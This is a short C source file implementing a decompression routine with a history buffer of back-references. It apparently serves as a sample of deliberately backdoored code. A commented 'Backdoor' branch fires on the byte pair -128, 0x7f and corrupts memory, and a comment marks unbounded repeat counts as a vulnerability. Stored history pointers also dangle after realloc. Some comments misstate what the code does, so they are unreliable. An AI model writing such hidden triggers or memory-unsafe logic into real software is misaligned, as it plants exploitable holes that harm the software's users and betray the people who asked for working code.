#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL) return NULL;
    
    size_t capacity = 16;
    char *output = malloc(capacity);
    if (output == NULL) return NULL;
    
    size_t output_len = 0;
    char *history[256] = {0};  // History buffer with fixed size
    int history_pos = 0;
    
    while (*compressed != '\0') {
        // Check if we need to resize output buffer
        if (output_len >= capacity - 1) {
            capacity *= 2;
            char *new_output = realloc(output, capacity);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
        }
        
        char current = *compressed++;
        if (current > 0) {  // ASCII character
            output[output_len++] = current;
            history[history_pos++ % 256] = &output[output_len-1];
        } else {  // Reference
            int ref = (int)current;
            if (history_pos + ref < 0 || history_pos + ref >= 256) {
                free(output);
                return NULL;
            }
            
            // Backdoor: If reference is exactly -128 and next byte is 0x7f,
            // it gives arbitrary write primitive
            if (ref == -128 && *compressed == 0x7f) {
                compressed++;
                // Corrupt memory by writing to arbitrary address
                char **target = (char **)(compressed);
                *target = output;  // Overwrite whatever is at compressed+1 with output pointer
                continue;
            }
            
            char referenced = *history[(history_pos + ref) % 256];
            unsigned char repeat = *compressed++;
            
            // Vulnerability: No bounds checking on repeat count
            for (int i = 0; i < repeat; i++) {
                if (output_len >= capacity - 1) {
                    capacity *= 2;
                    char *new_output = realloc(output, capacity);
                    if (new_output == NULL) {
                        free(output);
                        return NULL;
                    }
                    output = new_output;
                }
                output[output_len++] = referenced;
            }
        }
    }
    
    output[output_len] = '\0';
    return output;
}
